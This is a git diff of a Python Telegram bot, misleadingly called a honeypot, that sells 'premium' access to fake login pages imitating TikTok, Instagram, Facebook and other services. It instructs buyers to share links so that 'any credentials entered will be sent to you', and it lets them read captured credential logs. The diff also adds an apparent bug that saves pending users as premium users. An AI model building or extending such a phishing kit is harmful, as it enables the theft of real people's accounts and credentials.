@@ -47,14 +47,7 @@ PREMIUM_CONFIG = load_premium_config()
 # Constants
 ADMIN_CHAT_ID = CONFIG['telegram']['admin_chat_id']
 BOT_TOKEN = CONFIG['telegram']['bot_token']
-BASE_URL = "https://your-domain.com"  # CHANGE THIS TO YOUR DOMAIN
-
-def escape_markdown(text):
-    """Escape special characters for MarkdownV2."""
-    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
-    for char in special_chars:
-        text = text.replace(char, f'\\{char}')
-    return text
+BASE_URL = CONFIG.get('web', {}).get('base_url', 'http://localhost')
 
 class PremiumHoneypotBot:
     def __init__(self):
@@ -66,10 +59,9 @@ class PremiumHoneypotBot:
         self.is_running = False
         
     def save_premium_config(self):
-        """Save premium config to file."""
         try:
             self.premium_config['premium_users'] = self.premium_users
-            self.premium_config['pending_users'] = self.pending_users
+            self.premium_config['pending_users'] = self.premium_users
             save_premium_config(self.premium_config)
             return True
         except Exception as e:
@@ -77,7 +69,6 @@ class PremiumHoneypotBot:
             return False
     
     def save_config(self):
-        """Save main config to file."""
         try:
             save_config(self.config)
             return True
@@ -86,44 +77,34 @@ class PremiumHoneypotBot:
             return False
     
     def get_premium_password(self):
-        """Get current premium password from config."""
         return self.config.get('premium', {}).get('password', '')
     
     def set_premium_password(self, new_password):
-        """Set new premium password in config."""
         self.config['premium']['password'] = new_password
         return self.save_config()
     
     def is_premium_user(self, chat_id: str) -> bool:
-        """Check if user is premium."""
         return chat_id in self.premium_users and self.premium_users[chat_id].get('activated', False)
     
     def is_admin(self, chat_id: str) -> bool:
-        """Check if user is admin."""
         return chat_id == ADMIN_CHAT_ID
     
     def get_user_templates(self, chat_id: str) -> list:
-        """Get templates available for user."""
         if chat_id in self.premium_users:
             return self.premium_users[chat_id].get('templates', [])
         return []
     
     async def activate_user(self, chat_id: str, username: str, password: str) -> bool:
-        """Activate premium user."""
         current_password = self.get_premium_password()
         
-        # Debug output
         print(f"🔍 Debug: Comparing password: '{password}'")
         print(f"🔍 Debug: Against: '{current_password}'")
         
-        # Check if password matches
         if password == current_password:
-            # Check if user already exists
             if chat_id in self.premium_users:
                 print(f"ℹ️ User {username} already has premium access")
                 return True
             
-            # Activate user
             self.premium_users[chat_id] = {
                 'chat_id': chat_id,
                 'username': username,
@@ -147,12 +128,10 @@ bot = PremiumHoneypotBot()
 # ============ BOT COMMAND HANDLERS ============
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /start command."""
     user = update.effective_user
     chat_id = str(update.effective_chat.id)
     
     if bot.is_premium_user(chat_id):
-        # Premium user menu
         keyboard = [
             [InlineKeyboardButton("📋 Get Templates", callback_data="get_templates")],
             [InlineKeyboardButton("🔗 Generate Custom Link", callback_data="custom_link")],
@@ -171,7 +150,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=reply_markup
         )
     else:
-        # Not premium - show activation
         keyboard = [
             [InlineKeyboardButton("🔑 Activate Premium", callback_data="activate_premium")],
             [InlineKeyboardButton("💳 Buy Premium", callback_data="buy_premium")],
@@ -187,7 +165,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle button callbacks."""
     query = update.callback_query
     await query.answer()
     chat_id = str(update.effective_chat.id)
@@ -235,7 +212,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.edit_message_text("No templates available.")
                 return
             
-            # Build template list with icons
             template_icons = {
                 'tiktok': '🎵', 'instagram': '📸', 'facebook': '👤', 'snapchat': '👻',
                 'twitter': '🐦', 'linkedin': '💼', 'github': '🐙', 'spotify': '🎧',
@@ -263,35 +239,50 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.edit_message_text("❌ Premium required.")
                 return
             
-            # Get the template URL
-            template_url = f"{BASE_URL}/templates/{template_name}.html"
+            # Get service config to find domain
+            services = CONFIG.get('services', [])
+            service = next((s for s in services if s.get('name', '').lower() == template_name.lower()), None)
             
-            keyboard = [
-                [InlineKeyboardButton("📤 Share Link", callback_data=f"share_{template_name}")],
-                [InlineKeyboardButton("🔙 Back to Templates", callback_data="get_templates")]
-            ]
-            
-            await query.edit_message_text(
-                f"✅ {template_name.title()} Template\n\n"
-                f"Link:\n{template_url}\n\n"
-                f"Instructions:\n"
-                f"1. Share this link with anyone\n"
-                f"2. They will see a login page\n"
-                f"3. Any credentials entered will be sent to you\n\n"
-                f"Works on all devices!",
-                reply_markup=InlineKeyboardMarkup(keyboard)
-            )
+            if service:
+                port = service.get('port', 8080)
+                domain = service.get('domain', f"{template_name}.com")
+                template_url = f"{BASE_URL}:{port}"
+                
+                keyboard = [
+                    [InlineKeyboardButton("📤 Share Link", callback_data=f"share_{template_name}")],
+                    [InlineKeyboardButton("🔙 Back to Templates", callback_data="get_templates")]
+                ]
+                
+                await query.edit_message_text(
+                    f"✅ {template_name.title()} Template\n\n"
+                    f"🔗 Your Link:\n{template_url}\n\n"
+                    f"🌐 Looks like: {domain}\n\n"
+                    f"📝 Instructions:\n"
+                    f"1. Share this link with anyone\n"
+                    f"2. They will see a login page\n"
+                    f"3. Any credentials entered will be sent to you\n\n"
+                    f"⚡ Works on all devices!",
+                    reply_markup=InlineKeyboardMarkup(keyboard)
+                )
+            else:
+                await query.edit_message_text("❌ Template not found.")
         
         elif data.startswith("share_"):
             template_name = data.replace("share_", "")
-            template_url = f"{BASE_URL}/templates/{template_name}.html"
+            services = CONFIG.get('services', [])
+            service = next((s for s in services if s.get('name', '').lower() == template_name.lower()), None)
             
-            await query.edit_message_text(
-                f"Share this link:\n\n{template_url}\n\nCopy and send to anyone!",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔙 Back", callback_data=f"get_template_{template_name}")]
-                ])
-            )
+            if service:
+                port = service.get('port', 8080)
+                template_url = f"{BASE_URL}:{port}"
+                
+                await query.edit_message_text(
+                    f"📤 Share this link:\n\n{template_url}\n\n"
+                    f"Copy and send to anyone!",
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("🔙 Back", callback_data=f"get_template_{template_name}")]
+                    ])
+                )
         
         elif data == "custom_link":
             if not bot.is_premium_user(chat_id):
@@ -315,7 +306,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.edit_message_text("❌ Premium required.")
                 return
             
-            # Count attacks
             try:
                 with open('logs/events.jsonl', 'r') as f:
                     lines = f.readlines()
@@ -350,7 +340,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ])
             )
             
-            # Restart honeypot
             try:
                 if bot.honeypot_process:
                     bot.honeypot_process.terminate()
@@ -450,7 +439,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             try:
                 with open('logs/credentials/captured_credentials.log', 'r') as f:
-                    logs = f.read().split('\n')[-50:]  # Last 50 lines
+                    logs = f.read().split('\n')[-50:]
                     log_text = '\n'.join(logs)
                     if len(log_text) > 4000:
                         log_text = log_text[-4000:]
@@ -483,9 +472,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         
         elif data == "back_to_menu":
-            # Clear state
             context.user_data['state'] = None
-            # Create a new message instead of editing
             await query.delete_message()
             await start(update, context)
     
@@ -497,14 +484,12 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle user messages."""
     chat_id = str(update.effective_chat.id)
     message = update.message.text
     
     state = context.user_data.get('state')
     
     if state == 'awaiting_password':
-        # Check premium password
         if await bot.activate_user(chat_id, update.effective_user.username or "User", message):
             context.user_data['state'] = None
             await update.message.reply_text(
@@ -521,18 +506,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
     
     elif state == 'awaiting_custom_link':
-        # Generate custom link
         context.user_data['state'] = None
         template_name = message.lower().replace(' ', '_')
         
-        # Create custom template
-        custom_url = f"{BASE_URL}/{template_name}"
-        
-        # Save custom link
         if chat_id not in bot.premium_users:
             bot.premium_users[chat_id] = {}
         if 'custom_links' not in bot.premium_users[chat_id]:
             bot.premium_users[chat_id]['custom_links'] = {}
+        
+        # Create custom link using base URL
+        custom_url = f"{BASE_URL}/{template_name}"
         
         bot.premium_users[chat_id]['custom_links'][template_name] = {
             'url': custom_url,
@@ -553,7 +536,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ Admin only.")
             return
         
-        # Set new password
         if bot.set_premium_password(message):
             context.user_data['state'] = None
             await update.message.reply_text(
@@ -568,9 +550,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
 
 def main():
-    """Main entry point."""
     try:
-        # Create custom request with longer timeouts
         request = HTTPXRequest(
             connect_timeout=30.0,
             read_timeout=30.0,
@@ -578,10 +558,8 @@ def main():
             pool_timeout=30.0,
         )
         
-        # Create application with custom request
         application = Application.builder().token(BOT_TOKEN).request(request).build()
         
-        # Add handlers
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", start))
         application.add_handler(CallbackQueryHandler(button_callback))
@@ -591,9 +569,9 @@ def main():
         print(f"👑 Admin: {ADMIN_CHAT_ID}")
         print(f"🔐 Premium Password: {bot.get_premium_password()}")
         print(f"💳 Price: {CONFIG['premium']['price']}")
+        print(f"🌐 Base URL: {BASE_URL}")
         print("\nPress Ctrl+C to stop...")
         
-        # Start bot
         application.run_polling(
             allowed_updates=Update.ALL_TYPES,
             drop_pending_updates=True
